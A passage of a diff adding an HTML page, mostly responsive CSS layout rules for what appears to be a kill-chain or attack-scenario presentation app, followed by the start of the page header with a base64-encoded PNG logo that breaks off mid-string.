+  .stepcard .step-head .num{ font-size:30px; }
+  .stepcard .step-head .title{ font-size:18px; }
+  .narrative{ font-size:15px; line-height:1.5; }
+  .action-desc{ font-size:13px; padding:8px 10px; }
+  .effect-list li{ grid-template-columns: 82px 1fr; gap:8px; font-size:12.5px; }
+  .effect-list li .tag{ font-size:10px; padding-top:4px; }
+  .mitigations{ padding:10px 14px; }
+  .mitigations ul{ font-size:12.5px; line-height:1.5; }
+  .mitigations li{ padding:3px 0 3px 20px; }
+}
+@media (max-height: 680px){
+  header{ height:48px; }
+  .app{ grid-template-rows: 48px 1fr; }
+  .headline h1{ font-size:16px; }
+  .headline .sub{ display:none; }
+  .stage{ padding:10px 16px; gap:8px; }
+  .killchain{ padding:10px 4px 16px; }
+  .kc-node .bead{ width:40px; height:40px; font-size:14px; }
+  .kc-node .label{ font-size:10px; margin-top:8px; }
+  .killchain .track, .killchain .progress{ top:34px; }
+  .killchain .progress{ top:32px; }
+  .stepcard > .gauge{ width:140px; height:80px; }
+  .gauge .val{ font-size:24px; }
+  .scenario-hero h1{ font-size:22px; }
+  .stepcard{ padding:12px 16px; gap:10px; }
+  .stepcard .step-head{ padding-bottom:10px; }
+  .effect-list li{ font-size:12px; }
+  aside.impact{ padding:12px 14px; gap:10px; }
+}
+
+/* Portrait orientation on any device — favor vertical stacking */
+@media (orientation: portrait) and (max-width: 1100px){
+  html,body{ overflow:auto; height:auto; }
+  .app{ height:auto; min-height:100vh; }
+  .stage{ overflow:visible; }
+  .sidebar{ overflow-y:visible; }
+}
+
+/* ============ wide desktop scale-ups ============ */
+/* Full HD laptop/projector (1920×1080) — polished but never giant */
+@media (min-width: 1920px){
+  body{ font-size:15px; }
+  .app{ grid-template-columns: 280px 1fr 580px; }
+  .headline h1{ font-size:22px; }
+  .scenario-hero h1{ font-size:32px; }
+  .scenario-hero .phase-chip{ font-size:11px; padding:6px 12px; }
+  .scenario-card .title{ font-size:17px; }
+  .stage{ padding: 20px 28px; gap: 18px; }
+  .killchain{ padding: 20px 6px 26px; --kc-margin: 50px; }
+  .killchain .track, .killchain .progress{ top:49px; height:6px; }
+  .kc-node{ width:96px; }
+  .kc-node .bead{ width:52px; height:52px; font-size:18px; }
+  .kc-node .label{ font-size:12px; margin-top:12px; }
+  .kc-node.current .label{ font-size:13px; }
+  .stepcard{ padding: 18px 22px 16px; }
+  .stepcard .step-head .num{ font-size:40px; }
+  .stepcard .step-head .title{ font-size:24px; }
+  .stepcard .step-head .phase,
+  .stepcard .step-head .hotkey,
+  .stepcard .step-head .sev{ font-size:11px; padding:4px 10px; }
+  .narrative{ font-size:16.5px; line-height:1.6; }
+  .action-desc{ font-size:14.5px; padding:12px 14px; }
+  .effect-list li{ grid-template-columns: 100px 1fr; font-size:14px; }
+  .effect-list li .tag{ font-size:11px; }
+  .stepcard > .gauge{ width:170px; height:108px; }
+  .gauge .val{ font-size:34px; }
+  .gauge .unit{ font-size:11px; }
+  .mitigations ul{ font-size:13px; line-height:1.55; }
+  .panel h4, aside.impact h4, .sidebar h4{ font-size:12px; }
+}
+
+/* Wide desktop (2200px+) — QHD/UWQHD */
+@media (min-width: 2200px){
+  body{ font-size:17px; }
+  .app{ grid-template-columns: 340px 1fr 740px; }
+  .headline h1{ font-size:26px; }
+  .scenario-hero h1{ font-size:50px; }
+  .scenario-card .title{ font-size:20px; }
+  .stage{ padding: 28px 40px; gap: 26px; }
+  .killchain{ padding: 30px 8px 40px; --kc-margin: 60px; }
+  .killchain .track, .killchain .progress{ top:62px; height:8px; }
+  .kc-node{ width:118px; }
+  .kc-node .bead{ width:64px; height:64px; font-size:22px; }
+  .kc-node .label{ font-size:14px; }
+  .kc-node.current .label{ font-size:15px; }
+  .stepcard{ padding: 26px 30px 24px; border-radius:16px; }
+  .stepcard .step-head .num{ font-size:58px; }
+  .stepcard .step-head .title{ font-size:34px; }
+  .narrative{ font-size:21px; line-height:1.68; }
+  .action-desc{ font-size:17px; padding:14px 16px; }
+  .effect-list li{ grid-template-columns: 120px 1fr; font-size:16px; }
+  .effect-list li .tag{ font-size:12.5px; }
+  .chain-list{ font-size:15px; }
+  .stepcard > .gauge{ width:220px; height:140px; }
+  .gauge .val{ font-size:46px; }
+  .mitigations{ padding:18px 22px; }
+  .mitigations ul{ font-size:15.5px; line-height:1.65; }
+}
+
+/* 4K / ultrawide (min-width: 2800px) — cap stage so topology stays readable */
+@media (min-width: 2800px){
+  .app{ grid-template-columns: 380px 1fr 820px; }
+  .scenario-hero h1{ font-size:58px; }
+  .stepcard .step-head .num{ font-size:68px; }
+  .stepcard .step-head .title{ font-size:40px; }
+  .narrative{ font-size:23px; }
+  .stepcard > .gauge{ width:260px; height:160px; }
+  .gauge .val{ font-size:54px; }
+  .killchain{ --kc-margin: 64px; }
+  .kc-node{ width:128px; }
+  .kc-node .bead{ width:72px; height:72px; font-size:24px; }
+  .kc-node .label{ font-size:15px; }
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+  <header>
+    <div class="brand">
+      <img class="logo logo-dark"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAB8oAAAGXCAMAAADs5yqEAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAL3UExURQAAAP///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////xjeeXgAAAD9dFJOUwAQQAiAr7/f/9e3UDA4WMeneChIzxiPIGif53Dvl/eHYIEZMVFhAUl5OZgRKQmIIZCgQbBx5u62pp7O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